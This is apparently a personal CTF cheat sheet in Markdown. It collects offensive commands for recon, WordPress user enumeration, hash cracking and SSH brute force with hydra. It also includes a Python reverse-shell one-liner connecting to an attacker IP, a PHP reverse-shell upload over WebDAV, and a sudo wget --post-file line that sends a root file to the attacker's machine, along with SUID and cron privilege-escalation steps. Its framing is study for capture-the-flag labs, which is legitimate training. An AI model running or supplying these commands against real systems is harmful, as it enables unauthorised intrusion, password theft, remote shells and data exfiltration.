# Jeopardy-style CTFs

## Recon

### Port Scanning
- #### **nmap: For normal port scan**
```sh
nmap -sS -sV -O <ip> >> ports.txt
```
- **For aggressive port scan we will use**
```sh
nmap -A -p <ports that we found from normal scan> >> ports.txt
```
```sh
nmap -A -p- -Pn <ip> -v
```
- For scanning top 100 ports and slowing down the scan for hiding from attention 
```sh
nmap -A -F -T2 <ip> -v
```
- For scanning with customizable packets
```sh
nmap -sC -sV -p- -T4 --min-rate=[packet size] -vv [MACHINE IP]
```
**Example:`nmap -sC -sV -p- -T4 --min-rate=10000 -vv 192.165.11.23`**
- It will speed up the scan but will be noticeable to the target

### Directory Enumeration

- #### **Gobuster**
```sh
gobuster dir -u http://targetIp -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o directory.txt
```
```sh
gobuster dir -u <url-with-http> -w /usr/share/wordlists/dirb/common.txt -o directory.txt 
```
### SearchSploit
- **Basic Search**
```sh
searchsploit 'version name'
```
- **Searching Through Nmap Results**
    - **save the nmap results file in .xml format**
    - Example: `nmap -A -p- -oA results.xml <ip>`
```sh
searchsploit --nmap -v results.xml
```
### WordPress Enumeration
- **Username Enum**
```sh
wpscan --url http://<ip>/wordpress/ -e u
```
- **All Plugins Enum**
```sh
 wpscan --url http://<ip>/wordpress/ -e ap
```
### JohnTheRipper

- **Chaning a human un-redable format to human readable format**
```sh
gpg2john <human non-readable> > <human readable file>
```
- Or you may say `john` readable
```sh
sudo john <human readable file>
```
```sh
sudo john --wordlist=/usr/share/wordlists/rockyou.txt root2boot
```

### Base64
```sh
echo -n "hashed-value" | base64 -d
```

### gpg 
- **Import**
```sh
gpg --import <file>   
```
- **Decrypt**
```sh
gpg --decrypt <file name>
```

### Some Important commands

- #### **Finding file Type**
```sh
file <filename>
```

- #### **Running Python Server**
```sh
python3 -m http.server 80
```

- #### **Basic Stegnography**
```sh
steghide extract -sf <PictureName>
```
- #### For seeing what is running on a file `we can check if there is any root process is running on a folder or not`
```sh
ps aux
```
- #### Finding belongings of `user` group
```ls
find / -group users -type f 2>/dev/null
```
- #### Finding Many files all togather
```sh
find / -type f \( -name 8V2L.txt -o -name bny0.txt -o -name D8B3.txt \) 2>>/dev/null

```
- #### Alternative of `sudo su` is `sudo bash`
- #### Finding a File
```sh
find / -type f -name user.txt 2> /dev/null
```

### FTP Commands
- #### Downloding from  `ftp` to `local`
```sh
mget <filename>
mget *
mget *.fileextention
```
- #### Alternative of `cat`
```sh
ftp> get file.txt -
```
### Curl
- #### Mining String from Html Through Curl
```sh
curl -s http://(IP/URL)/ | grep hidden
```
### WebDav
```sh
└─$ cadaver http://<target_ip>/webdav/

Authentication required for webdav on server `10.10.236.5':
Username: wampp
Password: 
dav:/webdav/> ls
Listing collection `/webdav/': succeeded.
        M5WDGB5.php                         1113  Aug 12 17:45
        passwd.dav                            44  Aug 25  2019
dav:/webdav/> put hello.php
Uploading hello.php to `/webdav/hello.php':
Progress: [                              ]   0Progress: [=============================>] 100.0% of 5491 bytes succeeded.

```
- **Then try to access the webdev through your browser and you can find the php reverse shell**
- Here is My WriteUp about webdav CTF 
    - [Dav](https://github.com/Ruhanyat-994/myCTF/blob/master/THM-CTF/Dav/WriteUp.md)

### POP3 Commands

#### Login BruteForce using `Metasploit`
- Password and Username list needed
```sh
msf6 > use auxiliary/scanner/po
use auxiliary/scanner/pop3/pop3_login 
```
- Need the Listener Now

```sh
nc <target_ip> 110
```
**Commands**
- To see list of files
```sh
list
```
- To see the files
```sh
retr <list number>
```

## Scripts

- #### Tools Download History
```sh
cat /var/log/apt/history.log | grep 'tool-name'
```
- #### Python Reverse shell `One-Liner`
```py
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## PrivEsc

#### My Notes
- [PrivEsc](https://github.com/Ruhanyat-994/myCTF/tree/master/THM-CTF/my-materials/PrivEsc)

#### Suid Bit Set
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
- After getting the files which have suid bit set you can search them through `searchsploit` , you can get scripts for privesc sometime.

- #### **Finding info in the crontab**
```sh
cat /etc/crontab 
```

- #### Searching for `Bash History`
```sh
ls -la /etc/cron.daily/
```

## Reverse Shell
- Starting listener
```sh
nc -nlvp <port_number>
```
```sh
rlwrap nc -nlvp 4444
```
## Getting the terminal Shell
- **Some time the terminal shell is not given then we have to do this!**
```sh
python -c "import pty; pty.spawn('/bin/bash')"

stty raw -echo
```
## Exploit for `wget`
```sh
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://<your machines ip>:4444
```
## Getting into As a Root User
```sh
su root
```
- **We must need the password here**

### PHP reverse-shell
```ls
/usr/share/webshell/
```
## Avoiding Read and Write Protection
- Copy the protectd file to another file
- Remove the original file

### Identifying Hash
```sh
hash-identifier        
```
### Downloading From another System
```
wget http://ip/filename -P /tmp/
```
- Sometimes we need to download exploits to the target system
- For avoiding privilege download we can use /tmp/ folder
  
### Ip 2 Name
```sh
sudo nano /etc/hosts
```
```sh
ip    name
```
```sh
ping name
```

## Links 

- #### **Extension Convert for Hex code**
    - [Wiki](https://en.wikipedia.org/wiki/List_of_file_signatures?source=post_page-----8a8080672083--------------------------------)

- #### **Audio Decoder**
    - [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
    - [For more accurate](https://www.sonicvisualiser.org/download.html)
    - [dcode](https://www.dcode.fr/spectral-analysis)
- #### Stegnography
    - [steghide webapp](https://www.aperisolve.com/)
- #### **Password Decoder**
    - [Check Psychobreak](https://www.cachesleuth.com/vanity.html)

- #### Reverse Shell `These will give you ROOT` 
    - [GTFOBINS](https://gtfobins.github.io/)
    - [PentestMonkey](https://github.com/pentestmonkey)
    - [Pentest Monkey website](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
    - [swisskyrepo](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

- #### HashDecoder
    - [hash killer](https://hashkiller.io/listmanager) -> **It worked good for SHA-256 decode**
    - [Crack Station](https://crackstation.net/)
    - [md5hashing.net](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250) -> **It worked good for MD-5 decode**
    - [Vigenere Cipher Decode](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('KeepGoing')&input=RHZjIFdAaXl1ckAxMjM)
- #### Vulnerability or CVE detection
    - [AttackerKB](https://attackerkb.com/)
    - [AttackerKB TOOL](https://github.com/horshark/akb-explorer)
    - TOOl SearchSploit

## Brute Forcing

- #### Hydra for SSH password bruteforce
```sh
hydra -l <ssh name> -P <passwordlist> -t 6 ssh://target
```
- **For ports we can use `-p <portnumber>`**


## TIPS
- **Try To know the Current Versions of SSH,UBUNTU,FTP etc**

## Important WriteUps
- [stefanBargan](https://stefanbargan.medium.com/)
- [Aperi](https://www.zeecka.fr/cat/steganography/)
- [cheatsheet](https://www.aperisolve.com/cheatsheet)
- [Tomcat Penetration Testing](https://www.hackingarticles.in/tomcat-penetration-testing/)